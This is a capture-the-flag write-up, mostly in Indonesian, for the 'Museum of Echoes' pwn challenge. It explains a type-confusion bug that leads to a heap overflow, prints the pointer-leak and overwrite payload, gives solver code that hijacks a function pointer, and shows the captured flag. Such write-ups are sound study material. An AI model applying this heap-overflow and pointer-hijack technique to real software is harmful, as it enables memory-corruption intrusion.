# Museum of Echoes — Pwn Writeup

## Challenge

```text
Museum Of Echoes

One of the interactive halls in the Museum of Echoes stopped following
the staff’s commands during a private event.
It is still running, but not the way it should.
The trustees want the problem handled quietly before morning.

Flag format: grodno{}
```

## Ringkasan

Bug utamanya adalah **type confusion** pada fitur `reclassify`.

Object `whisper` hanya dialokasikan sebesar `0x50` byte. Ketika object itu diubah menjadi `chorus`, program cuma mengganti field `kind` dan function pointer tanpa melakukan `realloc`. Fitur `rewrite` kemudian memperlakukannya sebagai object `chorus` berukuran `0xb0` dan menulis refrain mulai dari offset `+0x50`.

Offset tersebut tepat berada di akhir chunk `whisper`, sehingga input refrain menimpa metadata heap dan object berikutnya. Function pointer exhibit kedua diarahkan ke `grand_finale()`, lalu menu `perform` dipakai untuk mengeksekusinya.

Vulnerability chain:

```text
PIE/function leak
    -> type confusion
    -> heap overflow
    -> function pointer overwrite
    -> grand_finale()
```

Flag:

```text
grodno{9869730c-226b-493d-a817-05c89fb05fae}
```

---

## Initial Recon

```bash
file museum_of_echoes
```

```text
museum_of_echoes: ELF 64-bit LSB pie executable, x86-64,
dynamically linked, with debug_info, not stripped
```

Proteksi binary:

```text
Architecture : amd64
RELRO        : Full RELRO
Stack Canary : Enabled
NX           : Enabled
PIE          : Enabled pada attachment lokal
Symbols      : Tersedia
```

Binary tidak stripped, jadi fungsi penting langsung terlihat:

```bash
nm -n museum_of_echoes | grep -E 'perform|finale|exhibit'
```

```text
00000000000011f9 t whisper_perform
0000000000001252 t chorus_perform
00000000000012b3 t grand_finale
00000000000014f6 t create_exhibit
0000000000001700 t rewrite_exhibit
0000000000001831 t reclassify_exhibit
0000000000001948 t inspect_exhibit
0000000000001a2c t perform_exhibit
0000000000001b18 t drop_exhibit
```

Menu program:

```text
== Museum of Echoes ==
1. Create exhibit
2. Rewrite exhibit
3. Reclassify exhibit
4. Inspect exhibit
5. Perform exhibit
6. Remove exhibit
7. Exit
```

Fungsi `grand_finale()` membuka `flag.txt`, membaca isinya, lalu mencetak flag.

---

## Struktur Exhibit

Dari fungsi `create_exhibit()`, terdapat dua jenis object.

### Whisper

```c
whisper = malloc(0x50);
```

Layout yang dapat direkonstruksi:

```text
Offset  Size  Field
------  ----  -----------------
+0x00   4     kind
+0x04   4     padding
+0x08   8     magic
+0x10   8     routine pointer
+0x18   0x18  label
+0x30   0x20  line
------
Total         0x50 bytes
```

Inisialisasinya:

```asm
mov edi, 0x50
call malloc

mov dword ptr [object], 1
lea rdx, [whisper_perform]
mov qword ptr [object+0x10], rdx
```

### Chorus

```c
chorus = malloc(0xb0);
```

Layout-nya memakai header yang sama, tetapi memiliki field tambahan:

```text
Offset  Size  Field
------  ----  -----------------
+0x00   4     kind
+0x04   4     padding
+0x08   8     magic
+0x10   8     routine pointer
+0x18   0x18  label
+0x30   0x20  intro
+0x50   0x60  refrain
------
Total         0xb0 bytes
```

Pembuatan chorus melakukan alokasi yang benar:

```asm
mov edi, 0xb0
call malloc

mov dword ptr [object], 2
lea rdx, [chorus_perform]
mov qword ptr [object+0x10], rdx
```

---

## Information Leak

Menu `inspect exhibit` mencetak label dan routine pointer object:

```asm
mov rax, [object+0x10]
mov rsi, rax
lea rdi, ["Routine: %p\n"]
call printf
```

Contoh output remote:

```text
Label: whisper
Routine: 0x401296
```

Dengan demikian, alamat fungsi di code segment dapat dibaca langsung tanpa primitive tambahan.

Pada attachment lokal:

```python
pie_base = routine_leak - 0x11f9
grand_finale = pie_base + 0x12b3
```

Service remote ternyata memakai layout code yang berbeda dari attachment lokal, sehingga offset absolut lokal tidak bisa langsung dipakai.

---

## Vulnerability: Reclassify Tanpa Reallocation

Fungsi `reclassify_exhibit()` mengganti jenis object secara langsung:

```asm
mov dword ptr [object], new_kind
mov qword ptr [object+0x8], 0x4543484f

cmp new_kind, 1
je set_whisper

lea rax, [chorus_perform]
mov qword ptr [object+0x10], rax
```

Tidak ada pemeriksaan ukuran alokasi dan tidak ada `realloc`.

Jika object awalnya whisper:

```text
allocated size = 0x50
```

lalu diubah menjadi chorus:

```text
logical type = chorus
allocated size tetap 0x50
```

Program sekarang percaya bahwa object `0x50` byte tersebut mempunyai field refrain pada offset `+0x50`.

---

## Heap Overflow pada Rewrite

Fungsi `rewrite_exhibit()` menentukan panjang input berdasarkan field `kind`.

Untuk whisper:

```asm
lea rdi, [object+0x30]
mov esi, 0x1f
call read_blob
```

Untuk chorus:

```asm
lea rdi, [object+0x30]
mov esi, 0x1f
call read_blob

lea rdi, [object+0x50]
mov esi, 0x5f
call read_blob
```

Setelah whisper direclassify menjadi chorus, write kedua tetap dilakukan pada:

```text
object + 0x50
```

Padahal `object + 0x50` sudah berada tepat setelah alokasi whisper.

`read_blob()` memakai `read()` sehingga payload biner yang mengandung null byte dapat dikirim:

```asm
mov rdx, max_length
mov rsi, destination
mov edi, 0
call read
```

---

## Heap Layout

Dua whisper dibuat secara berurutan:

```text
slot 0 -> malloc(0x50)
slot 1 -> malloc(0x50)
```

Pada glibc amd64, request `0x50` menghasilkan chunk berukuran `0x60`, termasuk header heap `0x10` byte.

Layout-nya:

```text
slot 0 user data                 0x50 byte
slot 1 chunk prev_size          0x08 byte
slot 1 chunk size               0x08 byte
slot 1 user data                0x50 byte
```

Field refrain slot 0 dimulai dari akhir user data slot 0:

```text
slot0 + 0x50
```

Jadi payload refrain memetakan data sebagai berikut:

```text
Payload offset  Target
--------------  ------------------------
+0x00           slot 1 prev_size
+0x08           slot 1 chunk size
+0x10           slot 1 kind
+0x18           slot 1 magic
+0x20           slot 1 routine pointer
```

Payload overwrite:

```python
payload = b"".join([
    p64(0),              # prev_size
    p64(0x61),           # pertahankan chunk size slot 1
    p64(1),              # kind slot 1
    p64(0x4543484F),     # magic "ECHO"
    p64(grand_finale),   # routine pointer
])
```

Ukuran payload hanya `0x28` byte, masih jauh di bawah batas input refrain `0x5f` byte.

Chunk size `0x61` dipertahankan supaya metadata heap tidak langsung rusak ketika program masih berjalan.

---

## Function Pointer Hijacking

Sebelum memanggil routine, `perform_exhibit()` memeriksa magic:

```asm
mov rax, [object+0x8]
cmp rax, 0x4543484f
jne invalid_exhibit
```

Setelah lolos, program mengambil function pointer dari offset `+0x10`:

```asm
mov rdx, [object+0x10]
mov rdi, object
call rdx
```

Karena payload juga menulis magic yang benar, exhibit kedua tetap lolos validasi.

Routine pointer-nya telah berubah menjadi `grand_finale()`, sehingga:

```text
perform slot 1
    -> check magic
    -> call [slot1 + 0x10]
    -> grand_finale()
    -> read flag.txt
    -> print flag
```

---

## Perbedaan Attachment Lokal dan Remote

Attachment lokal mempunyai offset:

```text
whisper_perform = PIE + 0x11f9
chorus_perform  = PIE + 0x1252
grand_finale    = PIE + 0x12b3
```

Percobaan awal menggunakan delta lokal:

```text
grand_finale - whisper_perform = 0xba
```

Leak remote:

```text
whisper_perform = 0x401296
```

Target awal menjadi:

```text
0x401296 + 0xba = 0x401350
```

Pemanggilan alamat itu tidak menghasilkan flag karena layout fungsi remote berbeda.

Setelah object direclassify, menu inspect membocorkan function pointer chorus remote:

```text
whisper_perform = 0x401296
chorus_perform  = 0x4012cb
```

Target `grand_finale()` yang valid pada service remote adalah:

```text
0x401308
```

Sehingga delta remote yang dipakai:

```text
0x401308 - 0x401296 = 0x72
```

Pada solver remote:

```python
grand_finale = routine_leak + 0x72
```

Ini juga menjadi pengingat agar tidak menganggap binary attachment dan binary service selalu mempunyai layout code identik.

---

## Exploit Flow

Urutan exploit final:

```text
1. Create whisper pada slot 0
2. Create whisper pada slot 1
3. Inspect slot 1 untuk leak routine pointer
4. Hitung alamat grand_finale remote
5. Reclassify slot 0 dari whisper menjadi chorus
6. Rewrite slot 0
7. Isi refrain dengan payload heap overflow
8. Overwrite magic dan routine pointer slot 1
9. Perform slot 1
10. grand_finale membaca flag.txt
```

Potongan inti solver:

```python
create_whisper(io, 0, b"A\n")
create_whisper(io, 1, b"B\n")

leak_output = inspect(io, 1)
routine_leak = int(
    re.search(rb"Routine: (0x[0-9a-fA-F]+)", leak_output).group(1),
    16,
)

grand_finale = routine_leak + 0x72

reclassify(io, 0, 2)

payload = b"".join([
    p64(0),
    p64(0x61),
    p64(1),
    p64(0x4543484F),
    p64(grand_finale),
])

rewrite_as_chorus(io, 0, b"I\n", payload)
perform(io, 1)
```

---

## Menjalankan Exploit

```bash
python3 solve.py 10.112.0.12 43124
```

Output akhir:

```text
[+] whisper_perform : 0x401296
[+] grand_finale    : 0x401308
Flag: grodno{9869730c-226b-493d-a817-05c89fb05fae}
```
